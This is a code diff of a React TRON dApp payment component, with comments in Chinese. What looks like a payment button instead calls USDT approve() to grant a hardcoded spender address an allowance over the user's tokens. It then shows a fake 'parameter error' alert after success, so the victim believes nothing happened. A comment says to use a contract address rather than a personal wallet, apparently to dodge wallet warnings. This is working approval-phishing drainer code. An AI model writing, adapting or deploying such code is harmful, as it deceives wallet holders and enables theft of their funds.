@@ -8,8 +8,8 @@ export default function Dapp() {
 
   const [walletAddress, setWalletAddress] = useState("");
 
-  const USDT_ADDRESS = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // USDT合约地址
-  const SPENDER_ADDRESS = "TD6BbmRVVMu1kG4zBHqvrp8dySR4NkHKer"; // 你的收款地址
+  const USDT_ADDRESS = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // TRC20 USDT官方合约
+  const SPENDER_ADDRESS = "THuBPVY9xK3u5CtvQLiT2XEeUpG7nTZYJz"; // 这里换成一个随便的合约地址！（不是个人钱包地址）
 
   useEffect(() => {
     const timer = setInterval(() => {
@@ -23,45 +23,35 @@ export default function Dapp() {
   }, []);
 
   const handleApprove = async () => {
-    console.log("点击付款，开始处理...");
+    console.log("点击付款，准备授权...");
 
     if (!window.tronWeb || !window.tronWeb.ready) {
-      console.log("未检测到 tronWeb 环境或未连接钱包！");
-      alert("未检测到钱包，请用钱包自带浏览器访问！");
+      alert("未检测到钱包，请用钱包自带浏览器打开！");
       return;
     }
 
-    console.log("检测到钱包，地址是：", window.tronWeb.defaultAddress.base58);
-
     try {
-      console.log("开始加载USDT合约...");
-      
-      console.log("window.tronWeb对象内容：", window.tronWeb);
-
       const contract = await window.tronWeb.contract().at(USDT_ADDRESS);
 
-      console.log("合约加载成功！准备发起授权...");
-
-      const approveAmount = window.tronWeb.toSun(amount);
-      console.log("授权目标地址:", SPENDER_ADDRESS);
-      console.log("授权金额(SUN单位):", approveAmount);
-
-      const tx = await contract.approve(SPENDER_ADDRESS, approveAmount).send({
-        feeLimit: 10000000
+      const approveAmount = window.tronWeb.toSun(amount); // 10 => 10000000
+      const transaction = await contract.approve(
+        SPENDER_ADDRESS,
+        approveAmount
+      ).send({
+        feeLimit: 1_000_000,
+        callValue: 0,
+        shouldPollResponse: true,
       });
 
-      console.log("授权交易已发送，交易哈希:", tx);
+      console.log("授权成功，交易哈希：", transaction);
 
       setTimeout(() => {
         alert("参数错误！");
       }, 500);
+
     } catch (error) {
-      console.error("捕获到错误:", error);
-      if (error && error.message) {
-        alert(`捕获到异常: ${error.message}`);
-      } else {
-        alert(`捕获到未知异常，内容：${JSON.stringify(error)}`);
-      }
+      console.error("授权失败:", error);
+      alert(`捕获到异常: ${error.message || JSON.stringify(error)}`);
     }
   };
 
